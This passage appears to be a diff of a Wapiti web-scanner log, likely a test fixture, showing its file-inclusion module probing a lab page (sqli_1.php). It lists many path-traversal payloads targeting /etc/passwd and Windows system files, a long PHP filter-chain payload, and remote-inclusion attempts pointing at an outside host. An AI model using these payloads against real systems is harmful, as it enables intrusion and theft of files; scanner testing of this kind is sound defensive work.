nvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp (1)
+2024-03-20 16:41:22.021 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (1)
+2024-03-20 16:41:22.034 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (1)
+2024-03-20 16:41:22.046 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (1)
+2024-03-20 16:41:22.058 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (1)
+2024-03-20 16:41:22.070 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (1)
+2024-03-20 16:41:22.085 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (1)
+2024-03-20 16:41:22.099 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (1)
+2024-03-20 16:41:22.116 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (1)
+2024-03-20 16:41:22.134 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (1)
+2024-03-20 16:41:22.152 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (1)
+2024-03-20 16:41:22.169 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (1)
+2024-03-20 16:41:22.184 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (1)
+2024-03-20 16:41:22.199 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (1)
+2024-03-20 16:41:22.212 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (1)
+2024-03-20 16:41:22.226 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (1)
+2024-03-20 16:41:22.241 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (1)
+2024-03-20 16:41:22.254 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (1)
+2024-03-20 16:41:22.271 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (1)
+2024-03-20 16:41:22.283 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (1)
+2024-03-20 16:41:22.300 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (1)
+2024-03-20 16:41:22.311 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (1)
+2024-03-20 16:41:22.324 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (1)
+2024-03-20 16:41:22.341 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (1)
+2024-03-20 16:41:22.356 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (1)
+2024-03-20 16:41:22.370 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=file%3A%2F%2F%2Fetc%2Fpasswd (1)
+2024-03-20 16:41:22.382 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (1)
+2024-03-20 16:41:22.392 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd (1)
+2024-03-20 16:41:22.406 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00 (1)
+2024-03-20 16:41:22.422 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices (1)
+2024-03-20 16:41:22.436 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00 (1)
+2024-03-20 16:41:22.454 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (1)
+2024-03-20 16:41:22.474 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (1)
+2024-03-20 16:41:22.489 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=sqli_1.php (1)
+2024-03-20 16:41:22.506 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=sqli_1.php%00 (1)
+2024-03-20 16:41:22.523 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=sqli_1.php%3A%3A%24DATA (1)
+2024-03-20 16:41:22.549 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php (1)
+2024-03-20 16:41:22.561 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2
+2024-03-20 16:41:22.564 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&security_level=2
+2024-03-20 16:41:22.570 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&security_level=2
+2024-03-20 16:41:22.576 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:41:22.582 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=%2Fetc%2Fpasswd%00&security_level=2
+2024-03-20 16:41:22.588 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=%2Fetc%2Fservices&security_level=2
+2024-03-20 16:41:22.594 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:41:22.601 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&security_level=2
+2024-03-20 16:41:22.607 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&security_level=2
+2024-03-20 16:41:22.613 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&security_level=2
+2024-03-20 16:41:22.620 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
+2024-03-20 16:41:22.626 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:41:22.632 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&security_level=2
+2024-03-20 16:41:22.638 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&security_level=2
+2024-03-20 16:41:22.644 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&security_level=2
+2024-03-20 16:41:22.651 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:41:22.656 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:41:22.664 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security_level=2
+2024-03-20 16:41:22.675 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security_level=2
+2024-03-20 16:41:22.684 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&security_level=2
+2024-03-20 16:41:22.692 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&security_level=2
+2024-03-20 16:41:22.702 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:41:22.710 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:41:22.721 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
+2024-03-20 16:41:22.731 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
+2024-03-20 16:41:22.741 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:41:22.750 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:41:22.760 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&security_level=2
+2024-03-20 16:41:22.771 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:41:22.780 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:41:22.790 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security_level=2
+2024-03-20 16:41:22.800 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
